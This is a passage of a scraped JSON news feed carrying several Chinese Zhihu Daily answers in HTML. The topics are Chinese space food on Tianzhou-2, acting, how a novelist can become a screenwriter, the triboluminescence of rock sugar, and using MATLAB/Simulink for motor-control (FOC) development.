本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67393"},{"title":"为什么「鱼香肉丝」和「宫保鸡丁」这两道菜会被「天舟二号」选中带到太空中？这两道菜的国民度有多高？","date":"2021-06-23 23:08:02","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-d93c510561e24491142db8a8eab3091f_l.jpg?source=8673f162\"><span>钱程，</span><span>微信公众号，微博ID：技术型吃货</span>\n<a href=\"https://www.zhihu.com/question/462108174/answer/1914423830\" hidden>阅读原文</a>\n</div>\n<div>\n<p>在之前神舟十号载人飞船的食品中，已经出现了「鱼香肉丝」和「宫保鸡丁」这两道菜。因此之前已经有研发基础了。此外，神舟九号的航天食品已经快到 100 种之多了，「天舟二号」带上去的绝对不止这两道菜。</p>\n<p>目前还没看到这两个菜式具体是以什么形式提供的。根据之前的资料，真空包装的「软罐头」食品的可能性比较大。</p>\n<hr>\n<p><strong>1. 为啥选这两个菜？</strong></p>\n<p>「鱼香肉丝」和「宫保鸡丁」能被选中，好吃当然是重要因素，但其实还有更重要的考虑。</p>\n<p><strong>比如说，这两者都没有渣。</strong></p>\n<p>太空中没有重力，带骨头、掉渣、掉粉的食物很容易在舱内漂得到处都是，对于航天员来说会非常难处理，还有可能损坏精密仪器。所以糖醋排骨、驴打滚之类的食物就不是很适合。鱼香肉丝和宫保鸡丁没这个问题。</p>\n<p><strong>还有，这两者都很方便做成「软罐头（常温料理包）」的形式常温保存，风味和质构不会变化太大，目前这样的产品也比较成熟。</strong></p>\n<p>航天食品很大一部分都是以「软罐头」的形式实现常温、长时间保存的。但有些食物，比如新鲜蔬菜，鱼肉之类，如果长时间加热，会失去原来的口感。风味、质构变化都很大。导致最后做出来的不好吃。鱼香肉丝和宫保鸡丁也没这个问题。</p>\n<p><strong>还有，这两者都属于荤素搭配，用料比较丰富，从营养价值上来看相对比较均衡一些。</strong></p>\n<hr>\n<p><strong>2. 航天食品一般都会有哪些分类？</strong></p>\n<p>说到航天食品，很多人可能受一些「年代久远」的科普书影响，认为都是牙膏状的半固体食物，直接挤到嘴里那种。其实那只是加加林时代的航天食品。现在航天食品早就百花齐放了，基本你在地面能吃到的食物类别，都有办法给你弄上太空。</p>\n<p>目前的太空食品可以分为如下几类<sup>[1]</sup>：</p>\n<p><strong>1）脱水干燥食品</strong></p>\n<p>通常是采用<strong>冷冻干燥</strong>的方式进行脱水的食品。各种蔬菜，水果，再到泡面，冰淇淋，万物皆可冻干。冻干食品由于水分含量太低，微生物无法存活，可以保存很久，复水起来非常快，航天员只要在飞船或空间站里将这些冻干食品复水，就可以吃了。</p>\n<p>当然，除了冷冻干燥，也有一些食品是喷雾干燥的。比如各种果汁、饮料等。</p>\n<p>（话说，冷冻干燥技术就是当初研发太空食品才搞出来的加工技术，现在早就下放到民间了）</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-7bb63b6fdcb915ded04183404bab17a3_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>2）「一大口」小食品</strong></p>\n<p>一般是面包、饼干之类的零食。为了防止掉渣，表面上覆盖了一层明胶之类的保护膜。吃的时候直接把整个食品塞嘴里，咀嚼的时候不要张嘴，食物就跑不出来。神舟五号的食品就属于这一类。</p>\n<p><strong>3）软罐头（常温料理包）</strong></p>\n<p>「软罐头」又叫「常温料理包」，它和罐头食品的制作方式相同，只是包装材质用了比较软的袋装材质。简单来说，食物制作完成、包装后，放入灭菌锅内进行灭菌，杀灭包装内所有微生物。经过灭菌之后的食物达到了「商业无菌」状态，可以常温保存很久而不用担心食品安全风险。这是目前航天食品的主要类别，在我们日常生活中也随处可见。</p>\n<p>我刚回答过一篇关于料理包的问题：</p>\n<p><a href=\"https://www.zhihu.com/question/461747523/answer/1911625859\">使用料理包成外卖普遍现象，部分成本低至 3 元，保质期长达一年半。你能接受这样的外卖吗？</a></p>\n<p><strong>4）冷冻食品和新鲜水果蔬菜</strong></p>\n<p>冷冻食品、新鲜水果蔬菜也可以作为航天员的选择。但是，为了防止微生物在航天器内传播，这些食品要经过严格的杀菌才能被带上飞船。新鲜水果蔬菜要用消毒水浸泡，确保表面微生物被杀死，而且要保证带上太空后在最前面几天被消耗掉。</p>\n<hr>\n<p><strong><strong>3. 中国航天食品的发展</strong></strong></p>\n<p>其实，如果你注意过我国的载人航天细节，你会发现航天员一次比一次吃得好。</p>\n<p>神舟五号，杨利伟的食物只有一口一个的月饼、小饼干和一些罐头食品。而且飞船上没法加热食物，只能吃常温的。<sup>[2]</sup></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-f82d0227e37bde15e8a43ba27d566d73_720w.jpg?source=8673f162\" alt=\"\"></figure><p>神舟六号就丰盛多了。食物分主食和副食两大类，主食有白米饭、八宝饭、咖喱饭、糯米饭。副食分为肉类、蔬菜、罐头 3 个大类。肉类包括陈皮牛肉、牛肉丸子、墨鱼丸子等，蔬菜类都是各种复水蔬菜，包括香菇菜心、素什锦等，罐头类以肉类罐头为主，有牛肉罐头、猪肉罐头等。总食品种类增加到四五十种。饭后还有冻干冰淇淋。<sup>[3]</sup></p>\n<p>而且神舟六号上有食物加热器，航天员终于能吃到热饭了。但是「由于加热器功率不够，做出来的米饭有点夹生」。<sup>[4]</sup></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-8c53bf7dd33b2fefca0ee9a0066b6eb7_720w.jpg?source=8673f162\" alt=\"\"></figure><p>到了神舟 7 号，大的食物分类没有太大变化，但品种增加到了 80 种左右。「航天员在用餐时还可以根据自己的喜好添加酸、辣、咸等口味的调味品。」<sup>[5]</sup></p>\n<p>神舟九号基本可以保证航天任务中「每天食品不重样」。从具体的食物看，已经是软罐头（常温料理包）为主了。</p>\n<blockquote>航天员景海鹏、刘旺、刘洋三位航天员一日三餐都能吃上什锦炒饭、咖喱炒饭、冬笋火腿炒饭。除了主食，黑椒牛柳、雪菜肉丝这些平时我们餐桌上常见的炒菜在太空也能吃到。此外，还有酱萝卜等小菜，有荤有素还有凉菜，搭配颇为精心。<sup>[6]</sup>\n</blockquote>\n<figure><img src=\"https://pic2.zhimg.com/v2-3db705bc92d0342c5f5a9ffc74d9e8be_720w.jpg?source=8673f162\" alt=\"\"></figure><p>到了神舟十号，食物种类进一步丰富。「增加了豆沙粽、新鲜水果、小米粥、酸奶等」，而且支持口味定制化：「根据聂海胜、张晓光、王亚平三名航天员的口味定制，聂海胜喜欢吃米饭，张晓光爱酸辣口味，王亚平偏爱甜食，都能得到满足」<sup>[5]</sup></p>\n<p>有文章也提到，神舟十号上已经出现了天舟二号的这两个选择：「热腾腾的米饭、香喷喷的<strong>鱼香肉丝、宫爆鸡丁</strong>……散发各种诱人香味的美食，让远在太空中的航天员尽情享受舌尖上的美味。<sup>[6]</sup></p>\n<hr>\n<p>总之，这次天舟二号的运送物资中出现「鱼香肉丝」和「宫保鸡丁」，毫不意外。</p>\n<p>期待更多好吃的。</p>\n<p>另外，这是我之前写过的关于「太空食品」的科普，有一些特别有趣的点（比如为啥太空中的可乐必须是减气版本），推荐大家看看：</p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/26103595\">钱程：要想把好吃的带上太空，首先要解决「掉粉」和「打嗝」的问题</a></p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/462108174\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737383"},{"title":"「最好的演员不必表演」，这句话是真的吗？","date":"2021-06-23 23:07:57","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-51d3729e177d7bb21cc2cf12af288df9_l.jpg?source=8673f162\"><span>2001室的库布里克，</span><span>导演/编剧/DP b站/公号：电影视与听</span>\n<a href=\"https://www.zhihu.com/question/455428915/answer/1954541499\" hidden>阅读原文</a>\n</div>\n<div>\n<p>我更倾向于这样看，电影是对演员的呈现，这和戏剧对演员的依赖不同。</p>\n<p>从我自己的创作角度，作为编剧和导演，我尽量不让演员处在一个完全需要她 / 他来虚构一段电影时间的内容的境地。</p>\n<p>我在【读戏】这个节目里区分了【表演图像】和【动作】，在我看来【表演图像】几乎都是要演的，【动作】则不需要演。</p>\n<p>所以我想可以这样理解题主的问题：好的表演未必是“演”出来的。</p>\n<p>我在《吉祥如意》的这篇影评中讨论过虚构和纪录，真实与表演，以及二者如何并非完全对立。</p>\n<blockquote>影片中的真实人物，在面对一个虚构人物时，他们的反应或者表演，是否具有真实性，或者具有多大的真实性呢？<br>在表演中有一个说法，叫做“moment of truth”，演员的【至真时刻】。简单说就是在完美的表演时刻中，演员真的成为了 ta 所塑造的人物，演员的身份以及电影拍摄的情景对演员的干扰暂时接近于零。也就是说“真实”，或者更为准确地说，「观感上真实的表演」，是可以与虚构创作共存的。<br>我们很容易忽略一点：即便是客观地拍摄真实的人物，他们在摄影机前的一举一动，本来就无可避免地带有一种【表演性】。甚至有人认为，纪录片的魔力恰恰在于人在镜头前潜意识里的表演性。</blockquote>\n<p><strong><em>一切在镜头前的行为都是表演，反过来，所有影像都是对表演的如实记录。</em></strong></p>\n<p>如果我们把【表演】理解成电影中演员在镜头前的一切行为，那么【表演】本身是中性的，有好的表演也有差的表演。</p>\n<p>经验丰富的演员可以通过技巧贡献真实的表演，让我们相信，让我们感动；同样没有表演经验的非专业演员也可以贡献让人惊叹的【表演】。</p>\n<p>所以其实好的表演真正的敌人是【假装】。</p>\n<p>【假装的表演】=“演”=不好的、让人出戏的【表演】</p>\n<p><strong>专业演员有可能让表演看不出假装，好的剧本和导演可以让非专业演员不必假装。但无论是专业还是非专业演员，都能够从【非假装】的剧本和导演指导下获益。</strong></p>\n<p>如果一定要修正一下问题中的说法：好的表演可能来源于不必假装。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/455428915\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737387"},{"title":"外行人想做编剧是不是没有希望？","date":"2021-06-23 23:07:51","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-d5f864f2112d667fd9101f3894da5e54_l.jpg?source=8673f162\"><span>徐小疼，</span><span>小说作者，编剧</span>\n<a href=\"https://www.zhihu.com/question/463088735/answer/1953189224\" hidden>阅读原文</a>\n</div>\n<div>\n<p>很可惜没能赶上题主放弃之前看到这个问题。但是，即使在现在，题主你如果愿意再看下我的回答，或许会对你有一些帮助。</p>\n<p>作为一个写小说的，你很难说自己是个完全的“外行人”。我自己也是最初写小说，后来转而从事编剧工作的。虽然小说和剧本的确不是同一种文学形式（甚至有的教剧作的老师拒绝把剧本看作一种“文学形式”），但是，你已经有了长期的文字工作积累，如果你的小说写得不算差的话，起码对文字是有感受的，你想要做编剧，是有基础的。</p>\n<p>我所在的北电文学系，核心理念是“故事为王”，认为电影的核心就是剧作故事，无论是视听也好，技术也罢，都是为了故事来服务的。所以，无论你是想做编剧，还是未来有做导演的想法，讲故事的能力都是基础中的基础。相比较完全没有文字工作经验的人，你写过小说，起码是知道故事是个什么东西，知道通过小说讲故事的一些方法的，你想要转行做编剧，本身就比那些什么都不会的人要基础高。</p>\n<p>但是，你现在为什么会处处碰壁呢？我来帮你分析一下。</p>\n<p>从小说转行剧本，不是简单地将你的故事写成剧本格式就可以的。首先你要明白，剧本和小说最大的不同在哪里。</p>\n<p>根据我自己的经验，两者最大的不同，就是你的文字，直接读者的不同，以及最终呈现的不同。</p>\n<p>剧本的直接读者是制片人，是导演，是演员，是摄录美，是剧组的工作人员；小说的直接读者，就是纯粹的读者（或者说是消费者）。</p>\n<p>剧本的最终呈现，是以电影 / 电视剧 / 戏剧的方式，也就是说，剧本会转化成一个具象的视听；而小说，是不会转化的，读者看到的就是你最初写下来的文字。</p>\n<p>你在写小说的时候，你考虑的是我怎么样通过我的文字，直接向读者传递我想表达的信息。这其中不可避免地会产生描述，描写，大段的对话，用以表达你想要传递的氛围啊，环境啊，人物啊，前史啊……这是完全没有问题的，好的描写，会让读者产生画面感，更好地跟着你的思路去走。写小说的人也时常会有一种误解（我曾经就有这种强烈的误解）：我写的小说画面感很强，所以我一定能写得好剧本。</p>\n<p>这是大错特错~</p>\n<p>小说的画面感，和剧本的画面感，完全是两码事。</p>\n<p>我前面说了，剧本和小说最大的区别，就在于你的直接读者是谁，你的最终呈现方式是什么。剧本的直接读者是其他的创作者，你要交给他们的，不是一部精妙的小说，而是一部以电影语言写成的剧本，这个剧本，需要告诉他们，你讲的是个什么故事，这个故事是怎么发展的，人物是什么样的，人物是怎么变化的，人物关系是怎么发展的，事件是怎么推进的，情节是怎么安排的，节奏是什么样的，风格是什么样的，类型是什么样的……</p>\n<p>简言之，作为编剧，你要交给他们的是【说明书】，【说明书】，【说明书】，重要的东西说三遍！</p>\n<p>小学的时候大家应该都学过说明文写作，说明文最大的特点，就是语句简洁，只说事，不描写。</p>\n<p>有些习惯写小说的朋友就要问了，我不描写，怎么把事说清楚呢？</p>\n<p>这里就要引用 <a href=\"http://www.zhihu.com/people/d318deb16feb995541d6ea4e6b8432a4\">@严艺之</a> 回答里提到的金句了：“Show, don't tell.”</p>\n<p>剧本的最终呈现方式是什么？无论是电影，电视剧，还是戏剧，最终呈现方式，都是视听。视听是什么，是视觉 + 听觉，这是两种人类最为直观的感受方式，是我们与生俱来的接收信息、认识世界的手段。视听所能传递的东西，比你从文字上看到的，要丰富得多。不信，你去想一想，为什么现在视频网站比知乎这种图文网站要火？因为我们的大脑，对视听信息的处理，比对文字信息的处理要更快，看起来更方便，更不费脑子，同样的时间，我们可以接收更多的视听信息。</p>\n<p>你回想一下在电影院里看电影的经历。画面上有进行着故事，画面里有主要人物有次要人物，有美术设计，有灯光，有镜头的缓缓运动，有道具在移来移去；你听得到声音，人物在说话，背景里有环境的声音，你甚至听得到画面上看不到的东西，还能听得到一些音乐片段……</p>\n<p>如果这些东西，在小说里描述出来，你或许需要几百字。但是，在电影里，一个几秒钟的镜头一 show，就把你几百字的描写 tell 完了。</p>\n<p>好，这个时候有朋友肯定又要问了，那我还不是得在写剧本的时候把这些东西都写出来吗，我不写出来，导演到时候怎么知道要这么拍呢？</p>\n<p>所以，我们就会看到很多刚开始写剧本的朋友，尤其是有写小说经验的朋友，在剧本里写写“镜头缓缓近到远往外拉”，“女主角穿着一条 valentino 的白底粉色花长裙”，“男主角交给自己的妈妈一块卡西欧的电子表”，“此时镜头快速切换到场景 23，又快速切到场景 17，再快速切到场景 36”，“男二大口大口地吃着面，面汤从他的嘴角流下来，听得见外面有车开过，有人叫卖，有知了在叫，有个人在跑”……</p>\n<p>嗯，不要笑，我自己就曾经这样写过~</p>\n<p>这样的剧本交给制片人，制片人第一个晕倒了~</p>\n<p>还是那句话，你要考虑怎么呈现，却不要考虑怎么描述。</p>\n<p>你还记得剧本的直接读者是谁吗？是剧组的工作人员。别人的专业水平比你强多了，你还是专心写好你的故事，不要考虑什么镜头啊，美术啊，声音啊，甚至剪辑啊，什么的乱七八糟的事情。</p>\n<p>那么，怎么样不靠描写，却能写出一个故事？（咱们先不说好故事，先把讲故事学会了再考虑怎么写得好）。</p>\n<p>把故事往下切分，不断地细分成小块，一个个解决，逐个地击破。</p>\n<p>在写自己的剧本之前，建议先多看一些电影。你想写什么类型的剧本，就看什么类型的电影。然后，把电影的剧本扒下来，先扒整个故事，看看这个故事，用几句话怎么去概括，人物到底做了一件什么事，发生了什么改变；</p>\n<p>然后扒事件（幕），这个故事里发生了几个事件（有几幕），分别是什么样的，在这几个事件（几幕）中，人物的情绪分别是什么样的，是如何逐渐产生变化的，人物关系又发生了什么改变，哪个事件是促使人物开始做事的激励事件，哪个事件是让人物消沉的灵魂黑夜，哪个事件是人物最终解决的高潮……</p>\n<p>接着继续往下扒情节，每个事件（每一幕），都有哪些情节，这些情节是用什么样的线索串起来的（是用道具，用人物动机，还是人物关系，情绪……），为什么这么安排，为什么先是这个情节再是下一个情节，这样安排是为了推动人物的变化，还是为了带走人物的情绪……</p>\n<p>最后扒每一场戏，每一场戏里，人物做了哪些动作？说了哪些台词？为什么要说这些台词、做这些动作？都传递了什么信息？这些信息又如何去一层一层往上作用，直到影响整个故事……</p>\n<p>如果你还有精力继续往下扒，那就继续细细扒开每一句台词，每一个动作，都是什么意义，什么作用，是不是多余了可以去掉，还是说必不可少……</p>\n<p>看到了吗，编剧的工作其实是非常复杂的，小到一句台词、一个动作，我们都得反复思考、仔细斟酌。我们已经忙着为人物设计动作、设计台词了，怎么有时间去考虑镜头怎么动，场景怎么布置，甚至剪辑怎么剪啊……</p>\n<p>当你扒了足够多的剧本，你就会发现，所有职业编剧，不管你写的是艺术片，还是商业片，在最最最基础的层面，都会更多地倾向于用动作去解决“讲故事”这个问题。当然也有例外，昆汀喜欢用台词（不过，他的台词通常也都是带着动作），斯科塞斯喜欢用旁白（但他的旁白很多时候也会带着画面中的动作），但是无论是台词还是旁白，也都是服务于整个讲故事的工作的。</p>\n<p>多用动作作为基础，去推动整个故事的发展，是你要成为编剧需要掌握的第一门技能。在小说中，可能你只要描写一两段，故事就继续下去了。在剧本里绝不可能（当然在一些文艺片里堆几个空镜，几个状态，也能推到下一段“情节”了，但我觉得题主想写的绝不是这样的剧本）。但是在剧本中，你必须要用一连串的动作。</p>\n<p>学会用动作去代替描述，是题主要跨的第一个门槛，也是你要练习的第一步。</p>\n<p>那么，接下来，就是按照刚才扒剧本的顺序，一层层往上练，用动作去推动一场戏，用一场场戏去推动一个情节，用一个个情节去推动事件，用一个个事件去推动整个故事。每一层，你都需要练扎实了，你才可以往上一层走，非常非常不建议跳着来。剧作是个盖楼的功夫，你不打地基起不了高楼，你练不会基础，你就写不好整个剧本。</p>\n<p>我们再回过来看之前提到的【说明书】概念，经过刚才这一番剖析，你是不是对说明书这个概念有了一点基础的感受？</p>\n<p>剧本这个说明书，说明的是什么？</p>\n<p>是你的人物，用什么样的动作，在什么样的场景下，经历了什么样的情节，什么样的事件，最终做成了什么样的一件事。和那些什么环境，氛围，人物形象描写，有关系吗？没有，一点关系都没有~</p>\n<p>什么样的人物，就会做什么样的动作。什么样的动作，就会导致什么样的情节。什么样的情节，就会导致什么样的事件。什么样的事件，就会导致什么样的故事……这就是对剧本的一个入门级的理解逻辑。</p>\n<p>所以，一个合格的剧本，只要你写对了动作，你的人物就写对了。只要你写对了人物和动作，你就能写对情节，就能写对事件，就能写对故事。只要你把这个逻辑理顺，你根本不需要任何描写去补充任何信息，就能让你剧本的直接读者 get 到你想讲的故事，是什么叙事风格，什么商业类型，人物是什么样的，摄录美大概是什么样的方向……（当然，人物小传什么的，还是需要去写的，但也只是一个提纲挈领，一个方向，不要当做小说那样去写）</p>\n<p>剧作真的是个吃功夫的行当，不是说你想写剧本，一下子就能写好。所以你处处碰壁，太正常了。但是你如果愿意像我说的那样，把整个剧本拆开，一点一点从基础开始往上练，我觉得你一定能逐渐地摸到剧作的门道，有一天肯定能实现你做编剧的梦想。</p>\n<p>好，再来聊聊你遇到的找编剧工作“处处碰壁”的问题。</p>\n<p>我刚入行的时候和你一毛一样，虽然小说写得还可以，但是做编剧真的不行，虽然上手过几个项目，但是都以失败告终（主要是因为我自己的能力问题）。有个有经验的编剧跟我说过，你刚入行的时候如果能碰到愿意教你的前辈带你，肯定是最好的，可惜你碰到的是希望你一来就能工作的合作伙伴，他们没有时间，也没有义务来教你怎么做编剧，所以就很可惜只能先再见了……我觉得，题主遇到的，就是那些希望你马上就能接手工作的人，而你的能力明显不足，自然也就只能处处碰壁了。</p>\n<p>你对自己的认识很对，【现在的你】能力明显是配不上你的梦想的，你处处碰壁是活该。但是，如果你不断练习，不断努力呢？或许你坚持几年，等你功夫练出来了，再去找工作，情况就会不一样。</p>\n<p>现在放弃，没有关系。因为练习剧作这件事，本身就花不了你多少时间，你即使现在已经找了一个其他工作开始变成一只普通社畜，你也可以挤出点时间，每天练习一小下，从写动作练起，一点一点把基础打好。</p>\n<p>以及，一开始不要上手写太长的故事，先从三五分钟的短片剧本写起，先学会通过简单的动作，简单的场景来讲清楚一个简单的事，慢慢地再把篇幅一点点增加，十分钟，十五分钟，二十分钟……如果你能写好短片了，以后写长片也不会是件难事。</p>\n<p>最后，不要放弃看电影。至少，每周看两到三部电影。尽量从比较成功的商业片、类型片看起，那些商业片，更有规律性，更好抓剧作的套路。</p>\n<p>题主，你如果要实现梦想，不要纠结现在一时。眼光放长，你还有很长的时间去实现梦想。很多厉害的编剧、导演，出道其实都不是特别年轻了。在这行，你的生活经验越丰富，越多样，你写故事的能力和底气也会越厚。即便你现在放弃了，做了其他工作，也请把这份工作当做你体验生活的一部分。你在工作之余勤练习，多看片，磨练自己，等到哪一天你有能力去做编剧了，第一部片就写你这几年的经历，连题材都有了，岂不美哉？</p>\n<p>加油~！</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/463088735\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737398"},{"title":"用钳子夹冰糖为什么会发光？","date":"2021-06-23 23:07:46","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-9108bc2da9a2d69611451fe756ec281b_l.jpg?source=8673f162\"><span>中科院物理所，</span><span>没错，我就是那个物理所。</span>\n<a href=\"https://www.zhihu.com/question/306550630/answer/622296913\" hidden>阅读原文</a>\n</div>\n<div>\n<p>冰糖的摩擦荧光确有其事。想见证奇迹的童鞋可以做一个小实验：找来一个透明的内部干燥（一定要干燥，越干燥现象越明显）的矿泉水瓶，用其四分之一的空间装上大块冰糖。在一个月黑风高的夜晚，拉上窗帘，关上灯，让室内伸手不见五指，然后迅速地摇晃塑料瓶，你就可以看到瓶中的冰糖一下下地发着蓝紫色的闪光。摇得越快，现象越明显！</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-a181beedf43d682d8e216cfb58552f3c_720w.jpg?source=8673f162\" alt=\"\"><figcaption>（图片来源：FPSoutback 分享的 youtube 视频）</figcaption></figure><p>你可能不知道，摩擦荧光（Triboluminescece）的研究历史已经有几百年了，早在 17 世纪就有人发现摩擦糖块会发出亮光。其机理在 Halliday 的《Fundamentals of Physics》里面有所叙述。由于冰糖晶体的非对称性，冰糖在断裂过程中断面会带上正负电荷，相当于把震动摩擦的机械能转化为了电势能。而电荷中和的放电过程激发了空气中的氮分子，氮分子退激发将能量以荧光形式放出。相似机理引起摩擦发光的晶体还有 LiF、NaCl、SiC 等。</p>\n<p>虽然多种晶体都有相似的发光现象，但是背后蕴含的机理问题有很多。比如，晶体的压电效应、扭曲和位错都能引起发光；还有些晶体不像冰糖这样靠激发氮分子来发光，而是由晶体本身被激发所致。除此之外，摩擦荧光也不仅限于非对称晶体，在某些对称晶体上也能观察到该现象。这些问题都有待人们去研究。这么看来，一个不起眼的小现象说不定蕴含着很多大学问呢！</p>\n<p>BY 中科院物理所 问答专栏</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/306550630\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737374"},{"title":"MATLAB 到底有多厉害？","date":"2021-06-23 23:07:38","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-741f273c7064d2a06a97b81e392a0588_l.jpg?source=8673f162\"><span>转子磁场定向，</span><span>十年FOC电控开发经验，B站/闲鱼/公众号”转子磁场定向“</span>\n<a href=\"https://www.zhihu.com/question/27850677/answer/1946934531\" hidden>阅读原文</a>\n</div>\n<div>\n<p>刚开始玩电机的时候也不喜欢 MATLAB，每次都是直接码代码，然后去转电机。</p>\n<p>效果不好就在代码里改来改去，晕晕乎乎调了一周进展也不大。这种情况就是陷入了调参数的怪圈，恶性循环进而打击自信，进步也很缓慢。</p>\n<p>后来学会了 simulink，才明白学习 FOC 一定要配合 MATLAB，进步快很多。</p>\n<p>1、<strong>理解离散系统</strong>：在 FOC 中经常涉及到上个开关周期的角度，电压，或者预测下个周期的角度，电流，一般都是通过延时模块实现。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-b51f0c2dbd5b345bb7861c826a4bdc30_720w.jpg?source=8673f162\" alt=\"\"><figcaption>delay 延时模块</figcaption></figure><p>为什么要使用这个模块呢？比如一般 PWM 比较值寄存器被改写后都是使能了预装载，采样后触发计算到比较值生效可以延时 0.5 个开关周期 Ts，也可以延时 1 个开关周期 Ts，或者 1.5 个 Ts。不同的延时对于控制效果有什么区别呢？只需要在 simulink 定义延时时间即可，非常方便对比不同的方案下的区别。这种调试在实物上实现要复杂很多！</p>\n<p>2、<strong>实现参数自整定</strong>：把所有的环路参数放在 m 文件里，在运行工程前，修改电机参数，环路参数等等，先运行 m 文件，可以实现参数自整定。要修改参数也只用改 m 文件，类似宏定义一样，环路的参数自整定和这个也差不多了。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-36e09a5d46e903e0fe051cfbd8dcdcbd_720w.jpg?source=8673f162\" alt=\"\"><figcaption>m 文件实现参数自整定</figcaption></figure><p>3、<strong>强大示波器功能</strong>：simulink 的示波器功能非常强大，可以不限制查看任意波形，这在实物调试中也很难做到，除非去开发上位机配合查看，但是也有通道和数据量的限制。一般 ARM M0 的平台也没有资源去开发上位机。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-bedafd725c1ac35f1ce6a04ccab6aa64_720w.jpg?source=8673f162\" alt=\"\"><figcaption>示波器显示电流电压</figcaption></figure><p>尤其是现在比较通用的直流侧单电阻采样波形，可以清晰看到每个扇区对应的电流波形和单电阻波形的对应关系：</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-1615a35f336bb6def0bbdc8fd5cf0a6d_720w.jpg?source=8673f162\" alt=\"\"><figcaption>单电阻采样波形</figcaption></figure><p>4、<strong>模块化的平台，缩短开发周期</strong>：一般开发一种新的观测器，阅读文献之后，经过 simulink 验证。在搭建好平台之后，把观测器，速度环，电流环，转矩补偿等等封装成各自的模块。需要验证哪个模块，即进行对应的修改。经过 simulink 验证的方法，基本都可以在实物中实现。如果 simulink 仿真失败，基本就直接放弃了。一般一个新的观测器仿真需要一到两周，可以大大缩短开发周期。</p>\n<p>在搭建了完整的仿真平台后，实物和仿真模型基本可以做到 95%以上的对应，除了一些非线性相关的因素，因为在仿真中无法模拟，需要在实物中实现。对于有经验的开发人员，拿到了离散的仿真模型，基本就等于拿到了代码。</p>\n<p>当然如果模型在连续域仿真，那当我没说，这种方法以无限的计算量替代离散仿真，基本等同于耍流氓。。。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-b5c3f4a466e4286e5f3c763b93b826e6_720w.jpg?source=8673f162\" alt=\"\"><figcaption>滑模和电流模型集成到同一平台</figcaption></figure><figure><img src=\"https://pic1.zhimg.com/v2-2765f999c986792c508cbbf7c70895bd_720w.jpg?source=8673f162\" alt=\"\"><figcaption>滑模模型，和公式一一对应</figcaption></figure><p>5、<strong>s 函数代码级仿真</strong>：如果有足够的精力，simulink 是可以实现 c 语言代码级仿真的。用 s 函数替代离散模块，代码放在 s 函数里，完全可以实现跟实物对应的仿真。移植到实物中代码也可以快速调试通过。</p>\n<p>s 函数运行的指令是在命令窗口输入：”mex xx.c“，xx 是 s 函数文件名。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-d3b5cf54a1f924d34c2d56ce94b6d141_720w.jpg?source=8673f162\" alt=\"\"><figcaption>s 函数代码</figcaption></figure><figure><img src=\"https://pic2.zhimg.com/v2-29cacf62c110321423a43a198178e355_720w.jpg?source=8673f162\" alt=\"\"><figcaption>s 函数框图</figcaption></figure><p>6、在线参数变化的仿真。</p>\n<p>一般来,Ld 和 Lq 会随着电流出现饱和特性，所以可以通过 m 文件编程，实现 Ld 和 Lq 在线根据电流查表确定电感值。但是实际的无感 FOC 控制依然使用固定值，电机模型使用的饱和模型，这样子可以评估无感 FOC 的控制方法对电感饱和是否敏感，或者对电感的敏感程度。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-5558e93fce2371af78e3359fa073998e_720w.jpg?source=8673f162\" alt=\"\"><figcaption>Ld 饱和模型</figcaption></figure><p>提供一种方法作参考：</p>\n<p>用如下文档里的代码生成电感表格：</p>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//ww2.mathworks.cn/help/physmod/sps/ref/elec_generateidealpmsmfluxdata.html\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>https://</span><span>ww2.mathworks.cn/help/p</span><span>hysmod/sps/ref/elec_generateidealpmsmfluxdata.html</span><span></span></a></p>\n<p>将表格导入如何可编辑的电机模型即可：</p>\n<p><a href=\"http://link.zhihu.com/?target=https%3A//ww2.mathworks.cn/help/autoblks/ref/fluxbasedpmsm.html%3FrequestedDomain%3Dzh\" target=\"_blank\" rel=\"nofollow noreferrer\"><span>https://</span><span>ww2.mathworks.cn/help/a</span><span>utoblks/ref/fluxbasedpmsm.html?requestedDomain=zh</span><span></span></a></p>\n<p>表格需要自己对应代码整理一下。</p>\n<p>7、模拟 MCU 的运行方式。使用 Simulink 离散模块搭建的方式，可以模拟 MCU 的硬件执行的结构。一般 MCU 最重要的是主频和中断，分别对应 Simulink 的最上层执行时间和定时执行的中断部分。如下图：</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-df619d870e5c6819ba0666c4bc59a4f7_720w.jpg?source=8673f162\" alt=\"\"><figcaption>powergui 模块设置仿真步长和类型</figcaption></figure><p>使用 powergui 模块设置成离散模式，设置仿真步长 5e-7，相当于仿真最上层是 2MHz 的执行频率，这个 2M 就类似于 MCU 的主频，显示，电机模型本体响应的计算就以这个频率执行。</p>\n<p>然后通过脉冲模块设置定时触发执行的控制模块，就相当于是定时执行的中断：</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-5f3c8b194864b463bc6af3adf445bd0f_720w.jpg?source=8673f162\" alt=\"\"></figure><p>使用 Pulse Generator 模块，执行周期 